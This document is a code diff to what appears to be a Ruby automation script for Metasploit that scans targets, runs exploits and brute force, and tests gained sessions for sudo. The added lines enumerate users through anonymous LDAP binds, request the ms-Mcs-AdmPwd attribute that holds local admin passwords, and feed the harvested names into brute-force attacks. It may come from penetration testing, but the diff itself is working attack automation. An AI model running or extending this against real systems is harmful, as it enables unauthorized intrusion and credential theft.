@@ -142,6 +142,39 @@ end
 end
 end
 
+# search for users via LDAP anonymous bind
+# need the ldap-utils package
+def ldap(target)
+shell = []
+arr = []
+names = []
+str = nil
+fmts = nil
+org = nil
+shell = %x|nmap -sV -p 389 --script ldap-rootdse #{target}|
+shell.each_line do |lin|
+        if (lin =~ /namingContexts/)
+                str = lin
+                fmts = "#{str}".squeeze(' ')
+                arr = fmts.split(" ")
+                org = arr[2]
+	else
+		return 1
+        end
+end
+
+names = %x|ldapsearch -LLL -w '' -x -H ldap://#{target}:389 -b #{org} -S ms-Mcs-AdmPwd dn|
+names = names.gsub!("\n\n", "\n")
+names = names.gsub!(/dn: uid=|cn=|,.*/) { '' }
+if (names =~ /dn: /)
+        names.gsub!(/dn:.*\n/, '')
+end
+file = File.open("/root/uid.txt", "w")
+file.puts(names)
+file.close
+
+end
+
 # wordlists
 pathdefault = "/usr/share/metasploit-framework/data/wordlists/"
 print_line("The user and password lists already been set, but you can adjust to yours...")
@@ -188,7 +221,7 @@ Dir.chdir('/root')
 File.foreach(path) { |each|
 File.open(path, 'r') {|file| line=file.gets; remains=file.read}
   run_single("setg RHOSTS #{line}")
-  run_single("db_nmap #{line} -sS")
+  run_single("db_nmap #{line} -sS -O")
   sleep 10
   run_single("db_nmap -sU -P0 --max-retries 1 --max-rtt-timeout=500ms --initial-rtt-timeout=200ms --min-rtt-timeout=200ms --open --stats-every 5s #{line}")
   sleep 10
@@ -199,6 +232,23 @@ if ("#{before}" != '')
 end
   before="#{line}"
 
+# Test if we get some system users via LDAP or MS AD
+framework.db.hosts.each do |host|
+	if (host.os_name =~ /[Ll]inux/)
+		host.services.each do |serv|
+			if (serv.state == Msf::ServiceState::Open)
+				if (serv.port.to_i == 389)
+					ldap(line)
+				end
+			end
+		end
+	end
+end
+
+# If we have found some users, put them on users file
+if (File.exist?('/root/uid.txt')) and !(File.zero?('/root/uid.txt'))
+	run_single("setg USER_FILE /root/uid.txt")
+end
 
 # If exploits don't work, try brute force on services
 if (framework.sessions.length <= 0)
@@ -214,6 +264,8 @@ if (framework.sessions.length <= 0)
     end
   end
 end
+
+run_single("sessions -l")
 
 # If we get a login and OS type is Linux, test if it gets sudo
 if (framework.sessions.length > 0)
@@ -303,6 +355,11 @@ if ($?.success?)
 	File.delete("/root/#{line}.xml")
 	File.delete("/root/#{line}.fo")
 end
+end
+
+# If LDAP or AD user file exist, remove it
+if (File.file?('/root/uid.txt'))
+	File.delete('/root/uid.txt')
 end
 
 # Terminate all open sessions and remove host from DB to don't contaminate next scan
